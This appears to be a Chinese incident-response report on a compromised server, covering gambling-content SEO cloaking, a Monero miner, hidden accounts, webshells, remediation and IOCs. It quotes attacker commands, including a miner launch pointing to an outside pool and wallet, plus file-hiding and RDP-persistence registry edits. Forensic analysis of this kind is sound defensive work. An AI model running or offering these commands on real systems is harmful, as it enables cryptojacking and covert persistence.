## 前言

**本文是前段时间处理某用户被黑的分析总结，用户被黑的表现是使用爬虫访问用户网站的首页时会出现博彩关键字，而使用正常浏览器访问时无相关的博彩关键词。这是典型的黑帽SEO的表现，针对这种技术，[前期文章](http://www.freebuf.com/articles/web/153788.html)已有相关分析，感兴趣的同学可以看一看。**

此次分析，发现用户的服务器被多波不同利益的黑客入侵，里面有一些比较有意思的内容，所以特意分析总结了一下。

## 一、概述

### 1、分析结果

经过分析，目前得到以下结论：

> 1）服务器上存在博彩信息与挖矿程序，说明被多波不同利益团队的黑客入侵；
>
> 2）此服务器于2018年9月21日被黑客入侵后加上相应的博彩内容，相应的IP为175.41.27.93；
>
> 3）此服务器在2016年2月份甚至更早就已经被黑客植入网马了；
>
> 4）服务器在2017年12月19日被植入挖矿程序；
>
> 5）系统被增加了隐藏账号test$，并且在2018年9月21日14:38发现账号guest有IP为212.66.52.88，地理位置为乌克兰登录的情况。

## 二、分析过程

### 2.1 入侵现象

2018年9月份，通过我司监测平台监测到某网站被植入博彩内容，具体如下：

![某网站被植入博彩内容](https://image.3001.net/images/20181008/1538987975_5bbb17c708a1a.jpg!small)

![某网站被植入博彩内容](https://image.3001.net/images/20181008/1538988000_5bbb17e0eb9f8.jpg!small)

网站被植入博彩信息

网站被植入博彩基本上说明网站被黑客入侵，我司“捕影”应急响应小组立即协助用户进行入侵分析。

###  **2.2 系统分析**

系统分析主要用于分析其系统账号、进程、开放端口、连接、启动项、文件完整性、关键配置文件等，通过系统相关项的分析判断其系统层面是否正常。对其系统层面分析，发现以下层面存在问题：

 **系统账号**

对系统账号的分析，目前发现系统存在以下账号：

    
    
    Administraotr、MYSQL_ZKEYS、test$ 、zhimei、renjian、APP_IWAM_61264026、APP_IWAM_6127201、guest
    

其中test$明显为隐藏账号，一般情况下系统管理员不会增加隐藏账号，该账号肯定为黑客增加。另外几个账号，如zhimei、renjian等为可疑账号，需要管理人员进行确认。

![系统账号情况](https://image.3001.net/images/20181008/1538988063_5bbb181f5920b.jpg!small)

![系统账号情况](https://image.3001.net/images/20181008/1538988083_5bbb1833905ae.jpg!small)

系统账号情况

![管理员信息](https://image.3001.net/images/20181008/1538988101_5bbb184520ffb.jpg!small)

管理员信息

管理员组中存在administrator和guest，一般情况下guest为来宾账号，不会增加到管理员组中，怀疑该账号为黑客增加到管理员组中。

系统账号存在两个问题：

> 1）服务器被增加test$隐藏账号
>
> 2）Guest账号被加入到管理员组中

 **日志分析**

通过相关安全产品的日志，可以看到guest账号于2018年9月21日14:38被IP为212.66.52.88的乌克兰IP登录，该账号密码肯定已泄露，建议禁用该账号。

![日志分析](https://image.3001.net/images/20181008/1538988132_5bbb186445079.jpg!small)

 **进程与服务分析**

对其服务器分析，发现其服务器的CPU利用率非常高，利用率为100%。发现主要被SQLServer.exe占用。

![CPU利用率为100%](https://image.3001.net/images/20181008/1538988169_5bbb18892baf2.jpg!small)

CPU利用率为100%

![SQLServer.exe占用CPU最高](https://image.3001.net/images/20181008/1538988207_5bbb18af26192.jpg!small)

SQLServer.exe占用CPU最高

找到该程序所在的目录，发现该程序放在C:\ProgramData\MySQL目录下，并且被目录被隐藏。里面有四个文件，两个bat文件，两个exe文件。

![找到该程序所在的目录](https://image.3001.net/images/20181008/1538988231_5bbb18c7d7d02.jpg!small)

【Startservice.bat功能分析】

对startservice.bat进行分析，其内容如下：

![startservice.bat](https://image.3001.net/images/20181008/1538988261_5bbb18e5e6394.jpg!small)

其功能如下：

1）set SERVICE_NAME=SystemHost，指定其服务名为SystemHost：

![指定其服务名为SystemHost](https://image.3001.net/images/20181008/1538988293_5bbb190537c32.jpg!small)

2）`Tomcat9 install"%SERVICE_NAME%" SQLServer.exe -o
stratum+tcp://pool.minexmr.com:7777–u
49ZRiTZK93yBqAJWBTh2zTAjvq8z9oTn38Rc2ScqSF7E8oRizddzy2iTh6kyyRibt`

`7Ai1w8RWhTAPPPti4ZABeMpHhCJa1F -p x -dbg -1-t 0`

使用Tomcat9 安装相应的挖矿程序，挖矿参数分析：

矿池地址 | pool.minexmr.com  
---|---  
矿池端口 | 7777  
矿工账号 |
49ZRiTZK93yBqAJWBTh2zTAjvq8z9oTn38Rc2ScqSF7E8oRizddzy2iTh6kyyRibt7Ai1w8RWhTAPPPti4ZABeMpHhCJa1F  
挖矿程序被植入时间 | 2017年12月19 日16:29  
挖数字货币类型 | XMR 门罗币,一种全匿名的数字货币。其特点在于交易过程全匿名，无法追踪。  
挖XMR数量与价值 | 7.6XMR 人民币约6000元  
  
![](https://image.3001.net/images/20181008/1538988410_5bbb197a67c0f.jpg!small)

矿池网站

![黑客挖XMR数量](https://image.3001.net/images/20181008/1538988444_5bbb199cd0aba.jpg!small)

黑客挖XMR数量

![挖矿程序被植入时间](https://image.3001.net/images/20181008/1538988478_5bbb19be72d94.jpg!small)

挖矿程序被植入时间

3）`Set ProcessName=SQLServer.exe`指定进程名为SQLServer.exe：

![指定进程名为SQLServer.exe](https://image.3001.net/images/20181008/1538988510_5bbb19de0264e.jpg!small)

4）`attrib +h +r %cd%\*.*`

作用：将该目录下的所有文件隐藏

5） `reg add "HKLM\system\CurrentControlSet\Control\Terminal Server`

`\WinStations\RDP-Tcp" /v "MaxConnectionTime"/t REG_DWORD /d 0x1 /f`

`reg add"HKLM\system\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp" /v "MaxDisconnectionTime" /tREG_DWORD /d 0x0 /f`

`reg add"HKLM\system\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0/f`

功能:配置注册表，作用为使远程连接永不超时。

6） `net accounts /forcelogoff:no`

功能: 防止强制注销用户

【mHi.bat功能分析】

mHi.bat的功能如下：

1）将c:\ProgramData及C:\ProgramData\MySQL隐藏，防止安全人员发现；

2）指定C:\ProgramData\MySQL、C:\WINDOWS\Tasks\AdobeFlash Player
Updater.job、C:\WINDOWS\Tasks\GoogleUpdateTaskMashine.job相关文件的访问控制权限，仅允许SYSTEM组用户完全控制：

![mHi.bat功能](https://image.3001.net/images/20181008/1538988585_5bbb1a29935bb.jpg!small)

mHi.bat功能

![calcls功能](https://image.3001.net/images/20181008/1538988620_5bbb1a4c97fee.jpg!small)

calcls功能

【SQLServer.exe功能分析】

子进程，主要功能用来挖矿

【Tomcat9.exe功能分析】

1）SQLServer.exe的父进程，用来守护SQLServer.exe,

2）SQLServer.exe一旦被关闭，会立即启动SQLServer.exe

【功能总结】

通过以上分析，可以看出，黑客增加的四个文件的主要作用如下：

![功能总结](https://image.3001.net/images/20181008/1538990215_5bbb20873a474.jpg!small)

【应急处置】

直接关闭SQLServer.exe,该程序立马启动。由于其存在父进程，直接查找父进程，命令如下：`wmic process
whereName="SQLServer.exe" get ParentProcessID`：

![直接查找父进程](https://image.3001.net/images/20181008/1538988727_5bbb1ab790523.jpg!small)

首先关闭父进程Tomcat9.exe，然后再关闭子进程SQLServer.exe，挖矿程序被清除，CPU使用正常。

![CPU使用正常](https://image.3001.net/images/20181008/1538989193_5bbb1c89e1b88.jpg!small)

 **开放端口**

对其该服务器进行分析，发现该服务器开放以下端口：

![开放以下端口](https://image.3001.net/images/20181012/15393409841866.png!small)

端口开放情况

![端口开放情况](https://image.3001.net/images/20181008/1538989242_5bbb1cba9138b.jpg!small)

![端口开放情况](https://image.3001.net/images/20181008/1538989293_5bbb1ced821fb.jpg!small)

端口开放情况

建议关闭 21 、 135 、 445 、 8080 等端口，其他端口需要根据业务需求来决定是否关闭。

 **其他分析**

对该服务器的连接、安装软件、关键配置文件、启动项分析，目前未发现异常。

 **分析结论**

通过对系统层面分析，其服务器系统层面主要存在以下问题：

1）服务器被增加test$隐藏账号

2）Guest账号被加入到管理员组中

3）guest账号于2018年9月21日14:38被IP为212.66.52.88的乌克兰IP登录，该账号密码已泄露，目前已禁用该账号

4）端口开放过多，其中21、135、445、8080等端口建议关闭

5）2017年12月19日已被植入挖矿程序

### 2.3 应用分析

 **博彩页面分析**

【技术原理】

通过内容分析，发现此次黑客为SEO性质的。其主要目的在于通过黑帽SEO获取经济利益，一般情况下，黑客植入博彩内容有以下途径：

前端劫持

> 前端劫持一般都是在网站的相应页面中插入JS脚本，通过JS来进行跳转劫持。也有发现黑客直接修改相应的页面内容的。

服务器端劫持

>
> 服务器端劫持也称为后端劫持，其是通过修改网站动态语言文件,如global.asax、global.asa、conn.asp、conn.php这种文件。这些文件是动态脚本每次加载时都会加载的配置文件，如访问x.php时会加载conn.php。这样的话，只需要修改这些全局的动态脚本文件(如global.asax)，访问所有的aspx文件时都会加载这个global.asax文件，可以达到全局劫持的效果。

针对以上两种劫持技术，可以直接查看我前期的技术分析：<http://www.freebuf.com/articles/web/153788.html>

【博彩分析】

通过页面分析判断为在服务器端劫持，服务器端劫持一般是修改全局配置文件，如global.asax、global.asa、conn.asp、conn.php。

通过对该服务器分析，发现其修改config_global.php该文件。植入如下内容：

![植入如下内容](https://image.3001.net/images/20181008/1538989323_5bbb1d0ba57ed.jpg!small)

这里面黑客将相应的劫持内容进行base64加密了，将其中base64加密的内容进行base64解密，得到以下内容：

![得到以下内容](https://image.3001.net/images/20181008/1538989364_5bbb1d34dc28c.jpg!small)

其中 function isSpider()函数主要用来判断是否为爬虫访问，爬虫的浏览器特征如下：

    
    
             $bots= array(                   'baidu'        => 'baiduspider',                   'sogou'        => 'sogou',                   '360spider'        => 'haosouspider',                   '360spider'        => '360spider',                   'bingbot'        => 'bingbot',                   'Yisou'        => 'Yisouspider',
    

如果是爬虫则返回<http://l5.wang2017.com/>相关的内容。

【应急处置】

处置的话比较简单，直接将黑客增加的base64加密的内容删除即可，删除相关内容以后，访问正常。

 **Webshell分析**

Webshell主要是网马，其作用为通过webshell可以控制整个服务器，并进行系统级别的操作，使用D盾对服务器查杀，发现存在23个webshell。

![webshell](https://image.3001.net/images/20181016/1539661909479.jpg!small)

webshell

选择部分其代码如下：

![201806r4kfjtv4zexnvfbf.jpg图片马](https://image.3001.net/images/20181008/1538989437_5bbb1d7dcc650.jpg!small)

201806r4kfjtv4zexnvfbf.jpg图片马

针对网站发现的23个webshell，目前相关webshell均已删除。

### 2.4 日志分析

未找到有效日志，无法分析入侵原因及途径。

## 三、IOC

### 3.1 IP

> 212.66.52.88
>
> 175.41.27.93

### 3.2 URL

> <http://l5.wang2017.com>

### 3.3 样本MD5

> 70D9E2761B18CB0E4C4051E905F9E7A5
>
> EA9F0B1E88B5E21B9A9D31D5C46E81D7
>
> A3CD992FDDC2300AD8A23AD16FE3725C
>
> A8ADE1F8D0D87E4D7A75919EE6B3740F
>
> 58A9B144762916FE227AF329F5D384F1
>
> DBBB0ACE277D955833696F06C610DE2E
>
> 7F7D78755E070860EFFFD1272F14C7A7
>
> 9A5772ED22973DA02A45872BBC3735F2
>
> E276D34B3AE124E8218CBC32B4D341B2
>
> B663F32281526B17A540655EC05EC9EC
>
> 0D66C67B8BEC9627B696DEB275862E72
>
> 634630797CACCC334EFF054FE6279E91
>
> AB908A995367FF0055DFF903F515B061
>
> 5D52847EC2CCC750951EF0765AEEC17B
>
> 249D7774648FB1CD309AA23B3F96430B
>
> C13D2297D244D398B6A311DDA87DBDC7
>
> C23206B81B06D64933C5FBC24AF69CF6
>
> E14E6B1629ED5079F55B69DF66EDAFD7
>
> 8D01D604794D3494CBB31570B1E54182
>
> 2A235990DD38A0BCBAF2C4835EB8C0A3
>
> 5D568BC15EE4D861583E68B63762C2B1
>
> 0D66C67B8BEC9627B696DEB275862E72

### 3.4 矿池地址

    
    
    stratum+tcp://pool.minexmr.com:7777
    

### 3.5 钱包地址

    
    
    49ZRiTZK93yBqAJWBTh2zTAjvq8z9oTn38Rc2ScqSF7E8oRizddzy2iTh6kyyRibt7Ai1w8RWhTAPPPti4ZABeMpHhCJa1F
    

***本文作者：feiniao，转载请注明来自FreeBuf.COM**

